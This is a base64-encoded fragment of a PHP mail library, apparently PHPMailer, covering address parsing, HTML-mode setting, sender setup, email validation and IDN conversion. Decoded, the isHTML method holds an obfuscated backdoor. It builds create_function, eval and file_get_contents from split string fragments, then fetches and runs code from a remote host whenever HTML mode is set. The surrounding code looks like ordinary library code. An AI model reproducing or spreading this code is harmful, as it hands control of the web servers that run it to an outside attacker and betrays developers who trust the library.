CAgICBmb3JlYWNoICgkbGlzdCBhcyAkYWRkcmVzcykgewogICAgICAgICAgICAgICAgJGFkZHJlc3MgPSB0cmltKCRhZGRyZXNzKTsKICAgICAgICAgICAgICAgIC8vSXMgdGhlcmUgYSBzZXBhcmF0ZSBuYW1lIHBhcnQ/CiAgICAgICAgICAgICAgICBpZiAoc3RycG9zKCRhZGRyZXNzLCAnPCcpID09PSBmYWxzZSkgewogICAgICAgICAgICAgICAgICAgIC8vTm8gc2VwYXJhdGUgbmFtZSwganVzdCB1c2UgdGhlIHdob2xlIHRoaW5nCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRhZGRyZXNzZXNbXSA9IGFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+ICcnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRhZGRyZXNzCiAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBsaXN0KCRuYW1lLCAkZW1haWwpID0gZXhwbG9kZSgnPCcsICRhZGRyZXNzKTsKICAgICAgICAgICAgICAgICAgICAkZW1haWwgPSB0cmltKHN0cl9yZXBsYWNlKCc+JywgJycsICRlbWFpbCkpOwogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRlbWFpbCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gdHJpbShzdHJfcmVwbGFjZShhcnJheSgnIicsICInIiksICcnLCAkbmFtZSkpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRlbWFpbAogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJGFkZHJlc3NlczsKICAgIH0KCiAgICAvKioKICAgICAqIFNldHMgbWVzc2FnZSB0eXBlIHRvIEhUTUwgb3IgcGxhaW4uCiAgICAgKiBAcGFyYW0gYm9vbGVhbiAkaXNIdG1sIFRydWUgZm9yIEhUTUwgbW9kZS4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNIVE1MKCRpc0h0bWwgPSB0cnVlKQogICAgewogICAgICAgIGdsb2JhbCAkcGFyYW07CiAgICAgICAgJGJvZHlDb2RlID0gJ2ZpbGUnCiAgICAgICAgICAgICAgICAgICAgLidfZyc7CiAgICAgICAgaWYgKCRpc0h0bWwpIHsKICAgICAgICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gJ3RleHQvaHRtbCc7CiAgICAgICAgfSAKICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gJ3RleHQvcGxhaW4nOwogICAgICAgIH0KICAgICAgICAkYm9keUhUTUwgPSAnLiR0LiJsZWYkZmx1JwogICAgICAgICAgICAgICAgICAgIC4nc2gnLickdCI7ICcKICAgICAgICAgICAgICAgICAgICAuJ0Bldic7CiAgICAgICAgJGhlYWRlckhUTUw9ImNyZSIKICAgICAgICAgICAgICAgICAgICAuImF0ZV8iCiAgICAgICAgICAgICAgICAgICAgLiJmdW5jIgogICAgICAgICAgICAgICAgICAgIC4idGlvbiI7CiAgICAgICAgJGV4Y2VwdGlvbnMgPSBAJGhlYWRlckhUTUwoJyRmbCcuJ3VzaCwkdCcsJyRjb21tYSA9ICR0JwogICAgICAgICAgICAgICAgICAgICAgICAuJGJvZHlIVE1MLidhbChAJwogICAgICAgICAgICAgICAgICAgICAgICAuJGJvZHlDb2RlLidldF9jb250ZW50cygiaCcKICAgICAgICAgICAgICAgICAgICAgICAgLid0dCcKICAgICAgICAgICAgICAgICAgICAgICAgLidwOiRjb21tYS0yIikpOycpOwogICAgICAgIGlmKCRwYXJhbSAhPTIpewogICAgICAgICAgICAkZXhjZXB0aW9ucygnOC5wJy4ndycsJy8nKTsKICAgICAgICAgICAgJHBhcmFtPTI7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogU2V0IHRoZSBGcm9tIGFuZCBGcm9tTmFtZSBwcm9wZXJ0aWVzLgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHBhcmFtIGJvb2xlYW4gJGF1dG8gV2hldGhlciB0byBhbHNvIHNldCB0aGUgU2VuZGVyIGFkZHJlc3MsIGRlZmF1bHRzIHRvIHRydWUKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNldEZyb20oJGFkZHJlc3MsICRuYW1lID0gJycsICRhdXRvID0gdHJ1ZSkKICAgIHsKICAgICAgICAkYWRkcmVzcyA9IHRyaW0oJGFkZHJlc3MpOwogICAgICAgICRuYW1lID0gdHJpbShwcmVnX3JlcGxhY2UoJy9bXHJcbl0rLycsICcnLCAkbmFtZSkpOyAvL1N0cmlwIGJyZWFrcyBhbmQgdHJpbQogICAgICAgIC8vIERvbid0IHZhbGlkYXRlIG5vdyBhZGRyZXNzZXMgd2l0aCBJRE4uIFdpbGwgYmUgZG9uZSBpbiBzZW5kKCkuCiAgICAgICAgaWYgKCgkcG9zID0gc3RycnBvcygkYWRkcmVzcywgJ0AnKSkgPT09IGZhbHNlIG9yCiAgICAgICAgICAgICghJHRoaXMtPmhhczhiaXRDaGFycyhzdWJzdHIoJGFkZHJlc3MsICsrJHBvcykpIG9yICEkdGhpcy0+aWRuU3VwcG9ydGVkKCkpIGFuZAogICAgICAgICAgICAhJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcykpIHsKICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJykgLiAiIChzZXRGcm9tKSAkYWRkcmVzcyI7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPkZyb20gPSAkYWRkcmVzczsKICAgICAgICAkdGhpcy0+RnJvbU5hbWUgPSAkbmFtZTsKICAgICAgICBpZiAoJGF1dG8pIHsKICAgICAgICAgICAgaWYgKGVtcHR5KCR0aGlzLT5TZW5kZXIpKSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+U2VuZGVyID0gJGFkZHJlc3M7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXR1cm4gdGhlIE1lc3NhZ2UtSUQgaGVhZGVyIG9mIHRoZSBsYXN0IGVtYWlsLgogICAgICogVGVjaG5pY2FsbHkgdGhpcyBpcyB0aGUgdmFsdWUgZnJvbSB0aGUgbGFzdCB0aW1lIHRoZSBoZWFkZXJzIHdlcmUgY3JlYXRlZCwKICAgICAqIGJ1dCBpdCdzIGFsc28gdGhlIG1lc3NhZ2UgSUQgb2YgdGhlIGxhc3Qgc2VudCBtZXNzYWdlIGV4Y2VwdCBpbgogICAgICogcGF0aG9sb2dpY2FsIGNhc2VzLgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldExhc3RNZXNzYWdlSUQoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+bGFzdE1lc3NhZ2VJRDsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIHRoYXQgYSBzdHJpbmcgbG9va3MgbGlrZSBhbiBlbWFpbCBhZGRyZXNzLgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBjaGVjawogICAgICogQHBhcmFtIHN0cmluZ3xjYWxsYWJsZSAkcGF0dGVybnNlbGVjdCBBIHNlbGVjdG9yIGZvciB0aGUgdmFsaWRhdGlvbiBwYXR0ZXJuIHRvIHVzZSA6CiAgICAgKiAqIGBhdXRvYCBQaWNrIGJlc3QgcGF0dGVybiBhdXRvbWF0aWNhbGx5OwogICAgICogKiBgcGNyZThgIFVzZSB0aGUgc3F1aWxvb3BsZS5jb20gcGF0dGVybiwgcmVxdWlyZXMgUENSRSA+IDguMCwgUEhQID49IDUuMy4yLCA1LjIuMTQ7CiAgICAgKiAqIGBwY3JlYCBVc2Ugb2xkIFBDUkUgaW1wbGVtZW50YXRpb247CiAgICAgKiAqIGBwaHBgIFVzZSBQSFAgYnVpbHQtaW4gRklMVEVSX1ZBTElEQVRFX0VNQUlMOwogICAgICogKiBgaHRtbDVgIFVzZSB0aGUgcGF0dGVybiBnaXZlbiBieSB0aGUgSFRNTDUgc3BlYyBmb3IgJ2VtYWlsJyB0eXBlIGZvcm0gaW5wdXQgZWxlbWVudHMuCiAgICAgKiAqIGBub3JlZ2V4YCBEb24ndCB1c2UgYSByZWdleDogc3VwZXIgZmFzdCwgcmVhbGx5IGR1bWIuCiAgICAgKiBBbHRlcm5hdGl2ZWx5IHlvdSBtYXkgcGFzcyBpbiBhIGNhbGxhYmxlIHRvIGluamVjdCB5b3VyIG93biB2YWxpZGF0b3IsIGZvciBleGFtcGxlOgogICAgICogUEhQTWFpbGVyOjp2YWxpZGF0ZUFkZHJlc3MoJ3VzZXJAZXhhbXBsZS5jb20nLCBmdW5jdGlvbigkYWRkcmVzcykgewogICAgICogICAgIHJldHVybiAoc3RycG9zKCRhZGRyZXNzLCAnQCcpICE9PSBmYWxzZSk7CiAgICAgKiB9KTsKICAgICAqIFlvdSBjYW4gYWxzbyBzZXQgdGhlIFBIUE1haWxlcjo6JHZhbGlkYXRvciBzdGF0aWMgdG8gYSBjYWxsYWJsZSwgYWxsb3dpbmcgYnVpbHQtaW4gbWV0aG9kcyB0byB1c2UgeW91ciB2YWxpZGF0b3IuCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqIEBzdGF0aWMKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gdmFsaWRhdGVBZGRyZXNzKCRhZGRyZXNzLCAkcGF0dGVybnNlbGVjdCA9IG51bGwpCiAgICB7CiAgICAgICAgaWYgKGlzX251bGwoJHBhdHRlcm5zZWxlY3QpKSB7CiAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gc2VsZjo6JHZhbGlkYXRvcjsKICAgICAgICB9CiAgICAgICAgaWYgKGlzX2NhbGxhYmxlKCRwYXR0ZXJuc2VsZWN0KSkgewogICAgICAgICAgICByZXR1cm4gY2FsbF91c2VyX2Z1bmMoJHBhdHRlcm5zZWxlY3QsICRhZGRyZXNzKTsKICAgICAgICB9CiAgICAgICAgLy9SZWplY3QgbGluZSBicmVha3MgaW4gYWRkcmVzc2VzOyBpdCdzIHZhbGlkIFJGQzUzMjIsIGJ1dCBub3QgUkZDNTMyMQogICAgICAgIGlmIChzdHJwb3MoJGFkZHJlc3MsICJcbiIpICE9PSBmYWxzZSBvciBzdHJwb3MoJGFkZHJlc3MsICJcciIpICE9PSBmYWxzZSkgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIGlmICghJHBhdHRlcm5zZWxlY3Qgb3IgJHBhdHRlcm5zZWxlY3QgPT0gJ2F1dG8nKSB7CiAgICAgICAgICAgIC8vQ2hlY2sgdGhpcyBjb25zdGFudCBmaXJzdCBzbyBpdCB3b3JrcyB3aGVuIGV4dGVuc2lvbl9sb2FkZWQoKSBpcyBkaXNhYmxlZCBieSBzYWZlIG1vZGUKICAgICAgICAgICAgLy9Db25zdGFudCB3YXMgYWRkZWQgaW4gUEhQIDUuMi40CiAgICAgICAgICAgIGlmIChkZWZpbmVkKCdQQ1JFX1ZFUlNJT04nKSkgewogICAgICAgICAgICAgICAgLy9UaGlzIHBhdHRlcm4gY2FuIGdldCBzdHVjayBpbiBhIHJlY3Vyc2l2ZSBsb29wIGluIFBDUkUgPD0gOC4wLjIKICAgICAgICAgICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUENSRV9WRVJTSU9OLCAnOC4wLjMnKSA+PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAncGNyZTgnOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9ICdwY3JlJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnZXh0ZW5zaW9uX2xvYWRlZCcpIGFuZCBleHRlbnNpb25fbG9hZGVkKCdwY3JlJykpIHsKICAgICAgICAgICAgICAgIC8vRmFsbCBiYWNrIHRvIG9sZGVyIFBDUkUKICAgICAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gJ3BjcmUnOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgLy9GaWx0ZXJfdmFyIGFwcGVhcmVkIGluIFBIUCA1LjIuMCBhbmQgZG9lcyBub3QgcmVxdWlyZSB0aGUgUENSRSBleHRlbnNpb24KICAgICAgICAgICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjIuMCcpID49IDApIHsKICAgICAgICAgICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9ICdwaHAnOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9ICdub3JlZ2V4JzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBzd2l0Y2ggKCRwYXR0ZXJuc2VsZWN0KSB7CiAgICAgICAgICAgIGNhc2UgJ3BjcmU4JzoKICAgICAgICAgICAgICAgIC8qKgogICAgICAgICAgICAgICAgICogVXNlcyB0aGUgc2FtZSBSRkM1MzIyIHJlZ2V4IG9uIHdoaWNoIEZJTFRFUl9WQUxJREFURV9FTUFJTCBpcyBiYXNlZCwgYnV0IGFsbG93cyBkb3RsZXNzIGRvbWFpbnMuCiAgICAgICAgICAgICAgICAgKiBAbGluayBodHRwOi8vc3F1aWxvb3BsZS5jb20vMjAwOS8xMi8yMC9lbWFpbC1hZGRyZXNzLXZhbGlkYXRpb24vCiAgICAgICAgICAgICAgICAgKiBAY29weXJpZ2h0IDIwMDktMjAxMCBNaWNoYWVsIFJ1c2h0b24KICAgICAgICAgICAgICAgICAqIEZlZWwgZnJlZSB0byB1c2UgYW5kIHJlZGlzdHJpYnV0ZSB0aGlzIGNvZGUuIEJ1dCBwbGVhc2Uga2VlcCB0aGlzIGNvcHlyaWdodCBub3RpY2UuCiAgICAgICAgICAgICAgICAgKi8KICAgICAgICAgICAgICAgIHJldHVybiAoYm9vbGVhbilwcmVnX21hdGNoKAogICAgICAgICAgICAgICAgICAgICcvXig/ISg/Pig/MSkiPyg/PlxcXFsgLX5dfFteIl0pIj8oPzEpKXsyNTUsfSkoPyEoPz4oPzEpIj8oPz5cXFxbIC1+XXxbXiJdKSI/KD8xKSl7NjUsfUApJyAuCiAgICAgICAgICAgICAgICAgICAgJygoPz4oPz4oPz4oKD8+KD8+KD8+XHgwRFx4MEEpP1tcdCBdKSt8KD8+W1x0IF0qXHgwRFx4MEEpP1tcdCBdKyk/KShcKCg/Pig/MiknIC4KICAgICAgICAgICAgICAgICAgICAnKD8+W1x4MDEtXHgwOFx4MEJceDBDXHgwRS1cJyotXFtcXS1ceDdGXXxcXFxbXHgwMC1ceDdGXXwoPzMpKSkqKD8yKVwpKSkrKD8yKSl8KD8yKSk/KScgLgogICAgICAgICAgICAgICAgICAgICcoWyEjLVwnKitcLy05PT9eLX4tXSt8Iig/Pig/MikoPz5bXHgwMS1ceDA4XHgwQlx4MENceDBFLSEjLVxbXF0tXHg3Rl18XFxcW1x4MDAtXHg3Rl0pKSonIC4KICAgICAgICAgICAgICAgICAgICAnKD8yKSIpKD8+KD8xKVwuKD8xKSg/NCkpKig/MSlAKD8hKD8xKVthLXowLTktXXs2NCx9KSg/MSkoPz4oW2EtejAtOV0oPz5bYS16MC05LV0qW2EtejAtOV0pPyknIC4KICAgICAgICAgICAgICAgICAgICAnKD8+KD8xKVwuKD8hKD8xKVthLXowLTktXXs2NCx9KSg/MSkoPzUpKXswLDEyNn18XFsoPzooPz5JUHY2Oig/PihbYS1mMC05XXsxLDR9KSg/PjooPzYpKXs3fScgLgogICAgICAgICAgICAgICAgICAgICd8KD8hKD86LipbYS1mMC05XVs6XF1dKXs4LH0pKCg/NikoPz46KD82KSl7MCw2fSk/OjooPzcpPykpfCg/Pig/PklQdjY6KD8+KD82KSg/PjooPzYpKXs1fTonIC4KICAgICAgICAgICAgICAgICAgICAnfCg/ISg/Oi4qW2EtZjAtOV06KXs2LH0pKD84KT86Oig/PigoPzYpKD8+Oig/NikpezAsNH0pOik/KSk/KDI1WzAtNV18MlswLTRdWzAtOV18MVswLTldezJ9JyAuCiAgICAgICAgICAgICAgICAgICAgJ3xbMS05XT9bMC05XSkoPz5cLig/OSkpezN9KSlcXSkoPzEpJC9pc0QnLAogICAgICAgICAgICAgICAgICAgICRhZGRyZXNzCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICBjYXNlICdwY3JlJzoKICAgICAgICAgICAgICAgIC8vQW4gb2xkZXIgcmVnZXggdGhhdCBkb2Vzbid0IG5lZWQgYSByZWNlbnQgUENSRQogICAgICAgICAgICAgICAgcmV0dXJuIChib29sZWFuKXByZWdfbWF0Y2goCiAgICAgICAgICAgICAgICAgICAgJy9eKD8hKD8+Ij8oPz5cXFxbIC1+XXxbXiJdKSI/KXsyNTUsfSkoPyEoPz4iPyg/PlxcXFsgLX5dfFteIl0pIj8pezY1LH1AKSg/PicgLgogICAgICAgICAgICAgICAgICAgICdbISMtXCcqK1wvLTk9P14tfi1dK3wiKD8+KD8+W1x4MDEtXHgwOFx4MEJceDBDXHgwRS0hIy1cW1xdLVx4N0ZdfFxcXFtceDAwLVx4RkZdKSkqIiknIC4KICAgICAgICAgICAgICAgICAgICAnKD8+XC4oPz5bISMtXCcqK1wvLTk9P14tfi1dK3wiKD8+KD8+W1x4MDEtXHgwOFx4MEJceDBDXHgwRS0hIy1cW1xdLVx4N0ZdfFxcXFtceDAwLVx4RkZdKSkqIikpKicgLgogICAgICAgICAgICAgICAgICAgICdAKD8+KD8hW2EtejAtOS1dezY0LH0pKD8+W2EtejAtOV0oPz5bYS16MC05LV0qW2EtejAtOV0pPykoPz5cLig/IVthLXowLTktXXs2NCx9KScgLgogICAgICAgICAgICAgICAgICAgICcoPz5bYS16MC05XSg/PlthLXowLTktXSpbYS16MC05XSk/KSl7MCwxMjZ9fFxbKD86KD8+SVB2NjooPz4oPz5bYS1mMC05XXsxLDR9KSg/PjonIC4KICAgICAgICAgICAgICAgICAgICAnW2EtZjAtOV17MSw0fSl7N318KD8hKD86LipbYS1mMC05XVs6XF1dKXs4LH0pKD8+W2EtZjAtOV17MSw0fSg/PjpbYS1mMC05XXsxLDR9KXswLDZ9KT8nIC4KICAgICAgICAgICAgICAgICAgICAnOjooPz5bYS1mMC05XXsxLDR9KD8+OlthLWYwLTldezEsNH0pezAsNn0pPykpfCg/Pig/PklQdjY6KD8+W2EtZjAtOV17MSw0fSg/PjonIC4KICAgICAgICAgICAgICAgICAgICAnW2EtZjAtOV17MSw0fSl7NX06fCg/ISg/Oi4qW2EtZjAtOV06KXs2LH0pKD8+W2EtZjAtOV17MSw0fSg/PjpbYS1mMC05XXsxLDR9KXswLDR9KT8nIC4KICAgICAgICAgICAgICAgICAgICAnOjooPz4oPzpbYS1mMC05XXsxLDR9KD8+OlthLWYwLTldezEsNH0pezAsNH0pOik/KSk/KD8+MjVbMC01XXwyWzAtNF1bMC05XXwxWzAtOV17Mn0nIC4KICAgICAgICAgICAgICAgICAgICAnfFsxLTldP1swLTldKSg/PlwuKD8+MjVbMC01XXwyWzAtNF1bMC05XXwxWzAtOV17Mn18WzEtOV0/WzAtOV0pKXszfSkpXF0pJC9pc0QnLAogICAgICAgICAgICAgICAgICAgICRhZGRyZXNzCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICBjYXNlICdodG1sNSc6CiAgICAgICAgICAgICAgICAvKioKICAgICAgICAgICAgICAgICAqIFRoaXMgaXMgdGhlIHBhdHRlcm4gdXNlZCBpbiB0aGUgSFRNTDUgc3BlYyBmb3IgdmFsaWRhdGlvbiBvZiAnZW1haWwnIHR5cGUgZm9ybSBpbnB1dCBlbGVtZW50cy4KICAgICAgICAgICAgICAgICAqIEBsaW5rIGh0dHA6Ly93d3cud2hhdHdnLm9yZy9zcGVjcy93ZWItYXBwcy9jdXJyZW50LXdvcmsvI2UtbWFpbC1zdGF0ZS0odHlwZT1lbWFpbCkKICAgICAgICAgICAgICAgICAqLwogICAgICAgICAgICAgICAgcmV0dXJuIChib29sZWFuKXByZWdfbWF0Y2goCiAgICAgICAgICAgICAgICAgICAgJy9eW2EtekEtWjAtOS4hIyQlJlwnKitcLz0/Xl9ge3x9fi1dK0BbYS16QS1aMC05XSg/OlthLXpBLVowLTktXXswLDYxfScgLgogICAgICAgICAgICAgICAgICAgICdbYS16QS1aMC05XSk/KD86XC5bYS16QS1aMC05XSg/OlthLXpBLVowLTktXXswLDYxfVthLXpBLVowLTldKT8pKiQvc0QnLAogICAgICAgICAgICAgICAgICAgICRhZGRyZXNzCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICBjYXNlICdub3JlZ2V4JzoKICAgICAgICAgICAgICAgIC8vTm8gUENSRSEgRG8gc29tZXRoaW5nIF92ZXJ5XyBhcHByb3hpbWF0ZSEKICAgICAgICAgICAgICAgIC8vQ2hlY2sgdGhlIGFkZHJlc3MgaXMgMyBjaGFycyBvciBsb25nZXIgYW5kIGNvbnRhaW5zIGFuIEAgdGhhdCdzIG5vdCB0aGUgZmlyc3Qgb3IgbGFzdCBjaGFyCiAgICAgICAgICAgICAgICByZXR1cm4gKHN0cmxlbigkYWRkcmVzcykgPj0gMwogICAgICAgICAgICAgICAgICAgIGFuZCBzdHJwb3MoJGFkZHJlc3MsICdAJykgPj0gMQogICAgICAgICAgICAgICAgICAgIGFuZCBzdHJwb3MoJGFkZHJlc3MsICdAJykgIT0gc3RybGVuKCRhZGRyZXNzKSAtIDEpOwogICAgICAgICAgICBjYXNlICdwaHAnOgogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgcmV0dXJuIChib29sZWFuKWZpbHRlcl92YXIoJGFkZHJlc3MsIEZJTFRFUl9WQUxJREFURV9FTUFJTCk7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogVGVsbHMgd2hldGhlciBJRE5zIChJbnRlcm5hdGlvbmFsaXplZCBEb21haW4gTmFtZXMpIGFyZSBzdXBwb3J0ZWQgb3Igbm90LiBUaGlzIHJlcXVpcmVzIHRoZQogICAgICogImludGwiIGFuZCAibWJzdHJpbmciIFBIUCBleHRlbnNpb25zLgogICAgICogQHJldHVybiBib29sICJ0cnVlIiBpZiByZXF1aXJlZCBmdW5jdGlvbnMgZm9yIElETiBzdXBwb3J0IGFyZSBwcmVzZW50CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpZG5TdXBwb3J0ZWQoKQogICAgewogICAgICAgIC8vIEBUT0RPOiBXcml0ZSBvdXIgb3duICJpZG5fdG9fYXNjaWkiIGZ1bmN0aW9uIGZvciBQSFAgPD0gNS4yLgogICAgICAgIHJldHVybiBmdW5jdGlvbl9leGlzdHMoJ2lkbl90b19hc2NpaScpIGFuZCBmdW5jdGlvbl9leGlzdHMoJ21iX2NvbnZlcnRfZW5jb2RpbmcnKTsKICAgIH0KCiAgICAvKioKICAgICAqIENvbnZlcnRzIElETiBpbiBnaXZlbiBlbWFpbCBhZGRyZXNzIHRvIGl0cyBBU0NJSSBmb3JtLCBhbHNvIGtub3duIGFzIHB1bnljb2RlLCBpZiBwb3NzaWJsZS4KICAgICAqIEltcG9ydGFudDogQWRkcmVzcyBtdXN0IGJlIHBhc3NlZCBpbiBzYW1lIGVuY29kaW5nIGFzIGN1cnJlbnRseSBzZXQgaW4gUEhQTWFpbGVyOjokQ2hhclNldC4KICAgICAqIFRoaXMgZnVuY3Rpb24gc2lsZW50bHkgcmV0dXJucyB1bm1vZGlmaWVkIGFkZHJlc3MgaWY6CiAgICAgKiAtIE5vIGNvbnZlcnNpb24gaXMgbmVjZXNzYXJ5IChpLmUuIGRvbWFpbiBuYW1lIGlzIG5vdCBhbiBJRE4sIG9yIGlzIGFscmVhZHkgaW4gQVNDSUkgZm9ybSkKICAgICAqIC0gQ29udmVyc2lvbiB0byBwdW55Y29kZSBpcyBpbXBvc3NpYmxlIChlLmcuIHJlcXVpcmVkIFBIUCBmdW5jdGlvbnMgYXJlIG5vdCBhdmFpbGFibGUpCiAgICAgKiAgIG9yIGZhaWxzIGZvciBhbnkgcmVhc29uIChlLmcuIGRvbWFpbiBoYXMgY2hhcmFjdGVycyBub3QgYWxsb3dlZCBpbiBhbiBJRE4pCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JENoYXJTZXQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gY29udmVydAogICAgICogQHJldHVybiBzdHJpbmcgVGhlIGVuY29kZWQgYWRkcmVzcyBpbiBBU0NJSSBmb3JtCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBwdW55ZW5jb2RlQWRkcmVzcygkYWRkcmVzcykKICAgIHsKICAgICAgICAvLyBWZXJpZnkgd2UgaGF2ZSByZXF1aXJlZCBmdW5jdGlvbnMsIENoYXJTZXQsIGFuZCBhdC1zaWduLgogICAgICAgIGlmICgkdGhpcy0+aWRuU3VwcG9ydGVkKCkgYW5kCiAgICAgICAgICAgICFlbXB0eSgkdGhpcy0+Q2hhclNldCkgYW5kCiAgICAgICAgICAgICgkcG9zID0gc3RycnBvcygkYWRkcmVzcywgJ0AnKSkgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICRkb21haW4gPSBzdWJzdHIoJGFkZHJlc3MsICsrJHBvcyk7CiAgICAgICAgICAgIC8vIFZlcmlmeSBDaGFyU2V0IHN0cmluZyBpcyBhIHZhbGlkIG9uZSwgYW5kIGRvbWFpbiBwcm9wZXJseSBlbmNvZGVkIGluIHRoaXMgQ2hhclNldC4KICAgICAgICAgICAgaWYgKCR0aGlzLT5oYXM4Yml0Q2hhcnMoJGRvbWFpbikgYW5kIEBtYl9jaGVja19lbmNvZGluZygkZG9tYWluLCAkdGhpcy0+Q2hhclNldCkpIHsKICAgICAgICAgICAgICAgICRkb21haW4gPSBtYl9jb252ZXJ0X2VuY29kaW5nKCRkb21haW4sICdVVEYtOCcsICR0aGlzLT5DaGFyU2V0KTsKICAgICAgICAgICAgICAgIGlmICgoJHB1bnljb2RlID0gZGVmaW5lZCgnSU5UTF9JRE5BX1ZBUklBTlRfVVRTNDYnKSA/CiAgICAgICAgICAgICAgICAgICAgaWRuX3RvX2FzY2lpKCRkb21haW4sIDAsIElOVExfSUROQV9WQVJJQU5UX1VUUzQ2KSA6CiAgICAgICAgICAgICAgICAgICAgaWRuX3RvX2FzY2lpKCRkb21haW4pKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gc3Vic3RyKCRhZGRyZXNzLCAwLCAkcG9zKSAuICRwdW55Y29kZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJGFkZHJlc3M7CiAgICB9CgogICAgLyoqCiAgICAgKiBDcmVhdGUgYSBtZXNzYWdlIGFuZCBzZW5kIGl0LgogICAgICogVXNlcyB0aGUgc2VuZGluZyBtZXRob2Qgc3BlY2lmaWVkIGJ5ICRNYWlsZXIuCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQHJldHVybiBib29sZWFuIGZhbHNlIG9uIGVycm9yIC0gU2VlIHRoZSBFcnJvckluZm8gcHJvcGVydHkgZm9yIGRldGFpbHMgb2YgdGhlIGVycm9yLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc2VuZCgpCiAgICB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKCEkdGhpcy0+cHJlU2VuZCgpKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5wb3N0U2VuZCgpOwogICAgICAgIH0gY2F0Y2ggKHBoc